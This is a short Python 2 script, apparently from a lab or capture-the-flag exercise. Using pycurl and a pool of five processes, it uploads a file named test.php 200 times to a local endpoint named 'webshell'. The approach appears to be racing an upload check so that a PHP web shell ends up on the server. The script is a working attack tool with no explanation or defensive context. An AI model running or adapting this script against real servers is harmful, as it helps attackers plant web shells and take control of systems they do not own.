import sys
import pycurl
from StringIO import StringIO
from multiprocessing import Pool

def curl():
    c = pycurl.Curl()
    c.setopt(c.URL, 'http://127.0.0.1:5001/webshell')
    c.setopt(c.VERBOSE, True)
    c.setopt(c.HTTPPOST, [
        ('file', (
            # upload the contents of this file
            c.FORM_FILE, 'test.php',
        )),
    ])

    c.perform()
    c.close()
    
def main():
    pool = Pool(processes=5)
    for i in xrange(200):
        result=pool.apply_async(curl)
        sys.stderr.write(str(i))

    pool.close()
    pool.join()
    
if __name__ == '__main__':
    # curl()
    main()
